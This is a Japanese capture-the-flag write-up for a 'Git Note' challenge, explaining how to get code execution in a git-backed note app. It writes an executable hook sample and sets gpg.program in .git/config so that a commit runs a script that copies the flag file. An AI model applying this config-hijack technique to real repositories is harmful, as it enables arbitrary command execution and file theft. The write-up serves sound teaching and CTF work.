# Git Note

https://alpacahack.com/daily-bside/challenges/git-note

## 問題の概要

python から Git を操作して、Gitでバージョン管理されている `notes/` を管理するアプリが動いています。

メニューから次のような操作ができます。

```
(a)dd note, (r)emove note, (s)how note, (l)ist notes, (u)ndo
```

`git` で操作するディレクトリは `-C REPO_DIR` で指定されています。

各操作でファイル名は `safe_join` で `notes/` 以下に制限されているため、パストラバーサルはできません。

```python
def safe_join(path: str) -> Path:
    target = (REPO_DIR / path).resolve()
    assert target.is_relative_to(REPO_DIR), "Path traversal detected!"
    return target
```

### add note

指定したファイルに入力した内容を書き込み、`git add` と `git commit` が実行されます。

### remove note

指定したファイルを `notes/` から削除し、`git rm` と `git commit` が実行されます。

### show note

指定したファイルの内容を表示します。

### list notes

`git ls-files` を実行して、Git で管理されているファイルの一覧を表示します。

### undo

`git reset --hard HEAD^` を実行して、最後のコミットを取り消します。

---

フラグは `/flag-{hash}.txt` に配置されています。

## 方針を考える

.git 以下のファイルも操作できて、ファイルの上書きも可能なので、いろいろやりようがありそうです。

### 方針1: `flag.txt` => `/flag.txt` の symlink を追加するコミットを作って `reset --hard` で worktree に symlink を作らせる

試しに symlink を置いて `show note` を実行してみましたが、`safe_join` で symlink が resolve されて Path traversal 判定になるのでダメでした。

そもそもフラグのファイル名がわからないのでダメですね。

### 方針2: git hooks でフラグを取得するスクリプトを実行する

`.git/hooks/pre-commit` に実行可能なスクリプトを置けば `git commit` の前に実行されます。

しかし、`add note` で作成したファイルは `chmod +x` しないと実行できないのでダメでした。

### 方針3: config-based hooks でスクリプトを実行する

git hooks の管理の面倒さを解消するために[最近導入された機能](https://github.blog/open-source/git/highlights-from-git-2-54/#h-config-based-hooks)が config-based hooks で、`git config` ベースで hooks を管理できるようになりました。

例えば `.git/config` に次のような設定を書けば pre-commit フックで指定したコマンドが実行されるようになりそうです。

> ```ini
> [hook "linter"]
>    event = pre-commit
>    command = ~/bin/linter --cpp20
> ```

ただし config-based hooks が導入されたのは Git 2.54 で、問題の Docker Image の Git は 2.47.3 なのでダメでした。

### 方針4: 既存の実行可能ファイルを書き換えて git から実行させる設定にする

`.git/hooks` にはデフォルトで `pre-commit.sample` のような hooks のサンプルファイルが作成されます。

```
$ ls -la notes/.git/hooks/pre-commit.sample
-rwxr-xr-x 1 nobody nogroup 1649 May 26 12:37 notes/.git/hooks/pre-commit.sample
```

これは実行可能ファイルで、権限はそのままに `add note` で内容を書き換えることができました。

Git では `diff.external` や `credential.helper` などの設定で、特定の機能で使用するプログラムを指定することができます。

何らかの config で `pre-commit.sample` が実行されるようにすればフラグを取得できそうです。

[git-config のドキュメント](https://git-scm.com/docs/git-config) をみると、`gpg.program` が使えそうでした。

## 解法

まず、`.git/hooks/pre-commit.sample` を次のような内容に書き換えます。

```sh
#!/bin/sh
cp /flag* /home/nobody/notes/flag.txt
```

次に、`.git/config` を次のような内容に書き換えます。

```ini
[user]
  email = nobody@example.com
  name = nobody
[commit]
  gpgsign = true
[gpg]
  program = /home/nobody/notes/.git/hooks/pre-commit.sample
```

これで commit 時に署名を行うようになり、署名のために `pre-commit.sample` を呼び出すようになります。

あとは commit を実行して `flag.txt` の内容を表示すればフラグを取得できます。

### 解答に使用した入力

- [input.txt](input.txt)

サーバーに送信すればフラグが得られます。

```sh
cat input.txt | nc localhost 1337
```

## 余談

ちなみに私は `-C` で操作ディレクトリ指定されてるし大丈夫やろ～ と思って作業環境で直接 `chal.py` を実行して `git reset --hard HEAD~1` でコミットしていない変更を吹き飛ばしました★

まぁ VSCode が細かい編集履歴を持っているので大丈夫なんですが、横着せずにコンテナ内で操作するべきでしたね(笑)
